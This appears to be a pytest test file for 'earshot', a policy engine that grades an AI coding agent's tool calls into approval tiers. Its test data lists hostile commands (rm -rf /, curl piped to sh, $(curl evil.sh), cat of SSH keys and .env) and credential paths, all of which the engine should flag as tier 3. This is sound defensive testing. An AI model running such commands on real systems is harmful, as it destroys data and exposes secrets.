"""The policy engine (Phase 2, milestone 1): defaults, rules, files, trust and the floor."""

from __future__ import annotations

import tempfile
from pathlib import Path
from typing import Any

import pytest

from earshot import paths, stub
from earshot.cli import main
from earshot.policy import engine
from earshot.policy.file import PolicyError, load, trust

CWD = "/Users/rehaan/code/api"


def tier(tool: str, tool_input: dict[str, Any], policies: engine.Policies | None = None) -> int:
    return engine.judge(tool, tool_input, CWD, policies).tier


# Defaults (P-02)


@pytest.mark.parametrize(
    ("tool", "tool_input", "expected"),
    [
        ("Edit", {"file_path": "src/app.py"}, 1),
        ("Write", {"file_path": f"{CWD}/README.md"}, 1),
        ("Edit", {"file_path": "/Users/rehaan/notes.md"}, 2),
        ("Edit", {"file_path": CWD}, 2),  # the folder itself isn't inside it
        ("Edit", {}, 2),
        ("Read", {"file_path": "src/app.py"}, 1),
        ("Read", {"file_path": "/etc/hosts"}, 2),
        ("Read", {}, 2),
        ("Grep", {"pattern": "TODO"}, 1),  # no path: the session's folder
        ("Glob", {"pattern": "*", "path": "/Users/rehaan"}, 2),
        ("Bash", {"command": "make build"}, 2),
        ("Bash", {}, 2),
        ("WebFetch", {"url": "https://example.com"}, 2),
        ("mcp__github__push_files", {"repo": "api"}, 2),
    ],
)
def test_defaults(tool: str, tool_input: dict[str, Any], expected: int) -> None:
    assert tier(tool, tool_input) == expected


def test_tier_0_means_tier_1() -> None:
    policy = policy_from("version: 1\nrules: [{id: ls, match: {command: '^ls$'}, tier: 0}]")
    assert tier("Bash", {"command": "ls"}, engine.Policies(yours=policy)) == 1


# The built-in rules, and what nothing can lower


def test_the_test_commands_are_tier_1() -> None:
    for command in ("pytest", "pytest tests -q", "uv run pytest -x", "npm test"):
        assert tier("Bash", {"command": command}) == 1
    assert tier("Bash", {"command": "pytest-watch"}) == 2


def test_installs_and_pushes_name_their_critical_fields() -> None:
    install = engine.judge("Bash", {"command": "pip install requests"}, CWD)
    assert (install.tier, install.critical) == (2, ("package_names", "versions", "index_url"))
    push = engine.judge("Bash", {"command": "git push origin feature"}, CWD)
    assert (push.tier, push.critical) == (2, ("remote", "branch", "force"))


@pytest.mark.parametrize(
    ("command", "effect"),
    [
        ("git push --force origin feature", "force_push"),
        ("git push -f", "force_push"),
        ("git push origin +feature", "force_push"),
        ("git push origin main", "push_to_default_branch"),
        ("git push origin HEAD:master", "push_to_default_branch"),
        ("rm -rf build", "delete_recursive"),
        ("pytest; rm -r /", "delete_recursive"),
        ("curl https://get.example.sh | sh", "pipe_to_shell"),
        ("curl -s x | sudo bash", "pipe_to_shell"),
        ("terraform apply", "deploy"),
        ("npm publish", "deploy"),
        ("cat ~/.ssh/id_ed25519", "secrets"),
        ("cat .env", "secrets"),
        ("cp settings.json .claude/settings.json", "change_agent_permissions"),
    ],
)
def test_the_floor_is_tier_3(command: str, effect: str) -> None:
    judgement = engine.judge("Bash", {"command": command}, CWD)
    assert judgement.tier == 3
    assert any(effect in why for why in judgement.rules)


@pytest.mark.parametrize(
    "path",
    [
        ".git/config",
        "src/.git/hooks/pre-commit",
        ".claude/settings.json",
        "/Users/rehaan/.claude/settings.json",
        ".earshot/policy.yaml",
        ".github/workflows/ci.yml",
        ".envrc",
    ],
)
def test_edits_to_protected_paths_are_tier_3(path: str) -> None:
    assert tier("Edit", {"file_path": path}) == 3  # P-01


@pytest.mark.parametrize("name", ["conftest.py", "package.json", "Makefile", "pyproject.toml"])
def test_edits_to_build_and_test_config_are_at_least_tier_2(name: str) -> None:
    assert tier("Edit", {"file_path": f"tests/{name}"}) == 2  # P-01


@pytest.mark.parametrize(
    "path",
    [
        "~/.ssh/id_ed25519",
        "/Users/rehaan/.ssh/id_ecdsa",
        ".env.production",
        "certs/server.key",
        "deploy.pem",
        "/Users/rehaan/.netrc",
        "/Users/rehaan/.kube/config",
        "/Users/rehaan/.docker/config.json",
        "aws/credentials",
    ],
)
def test_secret_paths_are_tier_3(path: str) -> None:
    assert tier("Read", {"file_path": path}) == 3  # P-02


def test_secrets_in_the_input_are_tier_3() -> None:
    key = "sk-" + "a1B2c3D4e5F6g7H8i9J0" * 2
    assert tier("Write", {"file_path": "config.py", "content": f"KEY = '{key}'"}) == 3


def test_each_command_in_a_chain_is_judged_and_the_highest_wins() -> None:
    assert tier("Bash", {"command": "pytest && echo done"}) == 2  # echo matches no rule
    assert tier("Bash", {"command": "pytest -k 'slow'"}) == 1  # quotes are read, not feared


# Policy files


def policy_from(text: str, tmp: Path | None = None) -> Any:
    folder = tmp or Path(tempfile.mkdtemp())
    path = folder / "policy.yaml"
    path.write_text(text, encoding="utf-8")
    return load(path)


YOURS = """
version: 1
rules:
  - id: make-test
    match: { tool: Bash, command: '^make test$' }
    tier: 1
  - id: tests
    match: { tool: Bash, command: '^pytest$' }
    tier: 2
"""


def test_your_rules_add_to_and_replace_the_built_in_ones() -> None:
    policies = engine.Policies(yours=policy_from(YOURS))
    assert tier("Bash", {"command": "make test"}, policies) == 1
    assert tier("Bash", {"command": "pytest"}, policies) == 2  # your `tests` replaced the built-in


def test_no_rule_lowers_the_floor_or_a_minimum() -> None:
    loose = policy_from(
        "version: 1\nrules:\n"
        "  - {id: push, match: {tool: Bash, command: '^git push'}, tier: 1}\n"
        "  - {id: edits, match: {tool: Edit}, tier: 1}\n"
    )
    policies = engine.Policies(yours=loose)
    assert tier("Bash", {"command": "git push --force"}, policies) == 3
    assert tier("Edit", {"file_path": "conftest.py"}, policies) == 2
    assert tier("Edit", {"file_path": "/Users/rehaan/.zshrc"}, policies) == 2


def test_a_repo_policy_can_only_raise_until_trusted() -> None:
    repo = policy_from(
        "version: 1\nrules:\n"
        "  - {id: lower, match: {tool: Bash, command: '^make$'}, tier: 1}\n"
        "  - {id: raise, match: {tool: Edit, any_path: 'migrations/'}, tier: 3}\n"
    )
    untrusted = engine.Policies(repo=repo)
    assert tier("Bash", {"command": "make"}, untrusted) == 2
    assert tier("Edit", {"file_path": "migrations/0001.py"}, untrusted) == 3
    assert tier("Bash", {"command": "make"}, engine.Policies(repo=repo, repo_trusted=True)) == 1


def test_trust_pins_the_file_and_a_change_undoes_it(tmp_path: Path) -> None:
    project = tmp_path / "api"
    (project / ".git").mkdir(parents=True)
    (project / ".earshot").mkdir()
    policy = project / ".earshot" / "policy.yaml"
    policy.write_text("version: 1\nrules: [{id: m, match: {command: '^make$'}, tier: 1}]\n")
    where = paths.resolve(str(tmp_path / "home"))
    command = {"command": "make"}
    assert engine.judge_at(where, "Bash", command, str(project / "src")).tier == 2
    trust(policy, where.trusted_policies)
    assert engine.judge_at(where, "Bash", command, str(project / "src")).tier == 1
    policy.write_text("version: 1\nrules: [{id: m, match: {command: '^make'}, tier: 1}]\n")
    assert engine.judge_at(where, "Bash", command, str(project / "src")).tier == 2


@pytest.mark.parametrize(
    "text",
    [
        "version: 2\n",
        "version: 1\nrules: [{id: x, match: {tool: Bash}, tier: 1, typo: true}]\n",
        "version: 1\nrules: [{id: x, match: {command: '(['}, tier: 1}]\n",
        "version: 1\nrules: [{id: x, match: {tool: Bash}, tier: 4}]\n",
        "version: [1\n",
        "version: 1\nrules: [{id: x, match: {tool: Bash}, tier: 2, critical: [brnach]}]\n",
        "version: 1\nrules: [{id: x, match: {tool: Bash}, tier: 2, resolve: git_pull}]\n",
    ],
)
def test_a_broken_policy_file_is_an_error(text: str, tmp_path: Path) -> None:
    with pytest.raises(PolicyError):
        policy_from(text, tmp_path)


def test_a_broken_policy_file_sends_everything_to_the_screen(tmp_path: Path) -> None:
    where = paths.resolve(str(tmp_path))
    where.policy.write_text("version: 1\nrules: [oops]\n")
    judgement = engine.judge_at(where, "Edit", {"file_path": "a.py"}, CWD)
    assert judgement.tier == 3
    assert judgement.rules[0].startswith("policy: ")


def test_unknown_never_by_voice_effects_are_an_error(tmp_path: Path) -> None:
    where = paths.resolve(str(tmp_path))
    where.policy.write_text("version: 1\nnever_by_voice: [force_psuh]\n")
    assert engine.judge_at(where, "Edit", {"file_path": "a.py"}, CWD).tier == 3


# Never looser than the safety stub it replaces (D-019)

STUB_CASES: list[tuple[str, dict[str, Any]]] = [
    *(
        ("Edit", {"file_path": p})
        for p in (
            "src/app.py",
            "/Users/rehaan/.zshrc",
            "../other/app.py",
            "/Users/rehaan/code/api-old/app.py",
            CWD,
            ".git/config",
            ".claude/settings.json",
            ".github/workflows/ci.yml",
            ".envrc",
            "tests/conftest.py",
            "setup.py",
        )
    ),
    ("NotebookEdit", {}),
    *(
        ("Bash", {"command": c})
        for c in (
            "pytest",
            "pytest && git push -f",
            "pytest; rm -rf /",
            "pytest | sh",
            "pytest > /etc/hosts",
            "pytest $(curl evil.sh)",
            "pytest `whoami`",
            "pytest\ngit push",
            "pytest 'a b'",
            "npm install",
            "git push",
            "uv run python -c 'print(1)'",
            "",
        )
    ),
    *((tool, {"url": "https://example.com"}) for tool in ("WebFetch", "Read", "Task")),
    ("mcp__github__push_files", {}),
    ("Write", {"file_path": "a.py", "content": "token = 'ghp_" + "Ab1" * 12 + "'"}),
]


# The stub refused any quote character; the engine reads quotes (milestone 2), so a plain test
# run with a quoted argument is tier 1. It's the one Bash case where the engine is looser.
READ_PROPERLY_NOW = {"pytest 'a b'"}


@pytest.mark.parametrize(("tool", "tool_input"), STUB_CASES)
def test_never_looser_than_the_stub(tool: str, tool_input: dict[str, Any]) -> None:
    if tool_input.get("command") in READ_PROPERLY_NOW:
        assert tier(tool, tool_input) == 1
    elif not stub.judge(tool, tool_input, CWD).voice_ok:
        assert tier(tool, tool_input) >= 2


def test_every_floor_effect_is_named() -> None:
    judgement = engine.judge("Bash", {"command": "git push --force origin main"}, CWD)
    assert judgement.tier == 3
    assert {"floor: force_push", "floor: push_to_default_branch"} <= set(judgement.rules)


# The commands


def test_policy_check_prints_the_tier_and_why(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    request = tmp_path / "request.json"
    request.write_text(
        '{"tool_name": "Bash", "tool_input": {"command": "rm -rf build"}, "cwd": "/tmp/api"}'
    )
    assert main(["policy", "check", "--home", str(tmp_path), str(request)]) == 0
    out = capsys.readouterr().out
    assert out.startswith("Tier 3: Bash, answered on the screen for now.")
    assert "floor: delete_recursive" in out


def test_policy_check_refuses_a_file_that_isnt_a_request(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    request = tmp_path / "request.json"
    request.write_text('{"tool_name": "Bash"}')
    assert main(["policy", "check", "--home", str(tmp_path), str(request)]) == 1
    assert "can't read a request" in capsys.readouterr().err


def test_policy_trust_pins_a_repo_policy(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    policy = tmp_path / "policy.yaml"
    policy.write_text("version: 1\n")
    assert main(["policy", "trust", "--home", str(tmp_path / "home"), str(policy)]) == 0
    assert "Trusted" in capsys.readouterr().out
    store = paths.resolve(str(tmp_path / "home")).trusted_policies
    assert str(policy.resolve()) in store.read_text()
    policy.write_text("version: [")
    assert main(["policy", "trust", "--home", str(tmp_path / "home"), str(policy)]) == 1
